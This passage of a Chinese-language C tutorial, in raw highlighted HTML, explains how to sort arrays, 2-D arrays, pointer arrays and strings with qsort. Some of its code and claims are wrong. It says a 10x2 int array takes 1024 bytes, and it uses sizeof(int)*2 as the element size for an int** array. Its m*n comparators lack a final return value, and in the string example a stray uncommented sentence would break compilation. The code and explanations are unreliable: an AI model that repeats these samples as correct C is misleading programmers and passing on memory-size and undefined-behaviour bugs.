keyword">sizeof</span><span class="token punctuation">(</span>arr1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>arr1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cmp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token operator">*</span>arr2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    arr2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> arr2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span> arr2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span> arr2<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> arr2<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">;</span> arr2<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> arr2<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> arr2<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>     <span class="token function">qsort</span><span class="token punctuation">(</span>arr2<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>arr2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cmp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* 如果将8改成sizeof(arr2) / sizeof(arr2[0])，排序会失败 */</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一维数组的两种表示方式，第一种直接定义成数组，第二种动态分配内存（请忽略这笨拙的初始化方式...），之所以提动态分配内存，是因为c中指针是核心，这种动态分配内存的方式除了初始化，熟练之后确实比直接定义成数组要方便两种定义方式对应的排序，是有细微差别的，如果把arr2的qsort第二个参数改成sizeof(arr2)/sizeof(arr2[0])，会报错，因为数组名arr1虽然可以等价为指针，但sizeof(arr1)的值是整个数组的大小，而sizeof(arr2)只是int*型指针arr2的大小，4个字节（32位计算机）可能这里qsort的第二个参数更习惯于写成具体变量或者数字，但第三个参数，随着序列arr变得复杂，变成二维，这种写法便会再次出现问题，具体见二维数组的排序</p><h2 id="二维数组动态分配内存的二维数组二维指针维度为m2">2.二维数组（动态分配内存的二维数组/二维指针）（维度为m*2）</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">cmp1</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>a<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>b<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> <span class="token operator">*</span>m <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span> <span class="token operator">*</span>n <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span>b<span class="token punctuation">;</span>  <span class="token comment">/* 此处为了看起来清晰一些，定义m、n来取代a、b，这里可以看到，入参的是一维指针类型，也就是之前所说的arr1的某个元素，即以为指针 */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>m<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> n<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> m<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> n<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> m<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> n<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">cmp2</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>a<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>b<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> <span class="token operator">*</span>m <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span> <span class="token operator">*</span>n <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>b<span class="token punctuation">;</span>  <span class="token comment">/* 与上面不同的是，这里入参的是二维指针，即arr2入参，重要！！！ */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>m<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> n<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> m<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> n<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> m<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> n<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> arr1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token function">qsort</span><span class="token punctuation">(</span>arr1<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>arr1<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">10</span><span class="token punctuation">,</span> cmp1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//qsort(arr1, 10, sizeof(int*), cmp1);</span>    <span class="token keyword">int</span> <span class="token operator">*</span><span class="token operator">*</span>arr2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        arr2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        arr2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">9</span><span class="token punctuation">;</span>        arr2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">9</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">qsort</span><span class="token punctuation">(</span>arr2<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cmp2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* 由于之前说过对指针sizeof的话，得到的大小是指针大小，而入参的是二维指针，而非二维数组，二维指针的元素为以为指针，因此这里的单个元素大小是以为int*的大小 */</span>    <span class="token function">qsort</span><span class="token punctuation">(</span>arr2<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">,</span> cmp2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* 单个元素大小也可以写成sizeof(int) * 2，因为arr2中每个元素都包含两个int型 */</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注：这里首先需要说一下二维数组和动态分配内存的二维指针的本质区别，它们在使用时几乎没什么区别，但在内存中的存储形式确实不同的，通过intarr1[10][2]的方式定义的二维数组，二维数组所占用的1024个字节的内存空间是连续的，而动态分配内存则是先开辟出一块存放10个int<em>型指针的内存，然后再分别对这10个int</em>指针分别进行开辟内存，因此动态分配内存的二维指针的内存不是连续的，因此，二维数组的第一个元素是第一个一维数组的第一个元素（从值上看，指向第一个一维数组和指向第一个一维数组的第一个元素的指针是相等的，但含义上却不同），但二维指针的第一个元素，只能是第一个int*型指针</p></blockquote><p>从上面可以看出，二维数组arr1和二维指针arr2虽然在本质上都是地址，但在qsort排序中cmp的写法是不同的cmp1中，qsort把传入的arr1当做指向数组第一个元素的指针，arr1的第一个元素是arr1[0][0]，所以cmp1的两个参数a和b，是指向“arr1[i][0]”的指针，类型为int*型cmp2中，qsort把传入的arr2当做指向数组第一个元素的指针，而arr2的第一个元素是一个指向整数数组的指针，所以cmp2的两个参数a和b，是指向“指向整形数组的指针”的指针，类型为int**型</p><p>写qsort(arr1, 10, sizeof(arr1) / 10,cmp1);时，第二个参数是元素个数，指10个一维数组，第三个参数与第二个参数对应，指一维数组的大小（注意是一维数组占内存的大小，而不是指向该一维数组的指针的大小，即不能写成sizoef(int<em>)）同时，写qsort(arr2, 10, sizeof(int</em>),cmp2);时，第二个参数是元素个数，指10个int<em>型元素，第三个参数是每个int</em>型元素的大小</p><p>在写cmp函数时，必须有第一行定义m、n并进行赋值，这样不容易混乱，第一行定义完后，后面的内容完全可以写的一样cmp1的第一行，传入的是指向arr1第一个元素arr1[i][0]的int<em>型指针，但前面说过，指向arr1[i][0]的int</em>型指针与指向arr1[i]的int<strong>型指针值是相同的，因此赋值之后的m和n可以当成指向arr1[i]的指针用cmp2的第一行，传入的是指向arr2第一个元素arr2[i]的int</strong>型指针，赋值后的含义与cmp1的理解是相同的，因此后面的代码cmp1和cmp2通用</p><h2 id="二维数组动态分配内存的二维数组二维指针维度为mn">3.二维数组（动态分配内存的二维数组/二维指针）（维度为m*n）</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MAX</span> <span class="token expression"><span class="token number">3</span>  </span><span class="token comment">//这里用用定义，因为main函数中的数组维度无法传进cmp中，只能用宏定义或全局变量</span></span><span class="token keyword">int</span> <span class="token function">cmp1</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>a<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>b<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> <span class="token operator">*</span>m <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span> <span class="token operator">*</span>n <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span>b<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> MAX<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">//用循环进行</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>m<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> n<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> m<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> n<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">cmp2</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>a<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>b<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> <span class="token operator">*</span>m <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span> <span class="token operator">*</span>n <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>b<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> MAX<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>m<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> n<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> m<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> n<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> arr1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">[</span>MAX<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token function">qsort</span><span class="token punctuation">(</span>arr1<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>arr1<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>arr1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>arr1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cmp1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token operator">*</span><span class="token operator">*</span>arr2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        arr2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">calloc</span><span class="token punctuation">(</span>MAX<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        arr2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">9</span><span class="token punctuation">;</span>        arr2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">9</span><span class="token punctuation">;</span>        arr2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">9</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">qsort</span><span class="token punctuation">(</span>arr2<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">,</span> cmp2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">qsort</span><span class="token punctuation">(</span>arr2<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cmp2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>m<em>2实际上是m</em>n的一种特殊形式，因此m<em>2也可以使用m</em>n的cmp函数，只是m<em>2维度只有2，也可以直接用条件if返回另外，由于m</em>n的cmp中循环需要有终止条件，而终止条件的设定需要数组定义时的维度，此维度无法以参数的形式传进cmp，而在cmp中数组是以指针的形式存在的，sizeof也无法获取数组维度，因此只能通过宏定义或全局变量的形式将维度传入</p><h2 id="字符串字符数组">4. 字符串（字符数组）</h2><p>字符串实际上就是一个字符数组，因此排序跟以为数组没有什么本质差别，只是强制类型转换改成char*型即可</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">cmp</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>a<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>b<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>  strcmp中参数为地址值，即指针，因此不用解引用    <span class="token comment">//return *(char*)a - *(char*)b;  //与上一行等价</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> str1<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"azsxdcfvg"</span><span class="token punctuation">;</span>    <span class="token function">qsort</span><span class="token punctuation">(</span>str1<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cmp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//char *str2 = (char*)"azsxdcfvg";  //不能用这种方式定义，会报莫名其妙的错</span>    <span class="token keyword">char</span> <span class="token operator">*</span>str2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">calloc</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token string">"azsxdcfvg"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>str2<span class="token punctuation">,</span> <span class="token string">"azsxdcfvg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">qsort</span><span class="token punctuation">(</span>str2<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cmp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>定义字符串要么直接定义成字符数组，要么动态开辟内存，然后用strcpy进行拷贝，用指针直接指向字符串会报莫名其妙的错</p><h2 id="字符串数组">5. 字符串数组</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">cmp1</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>a<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>b<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">cmp2</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>a<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>b<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>b<span class="token 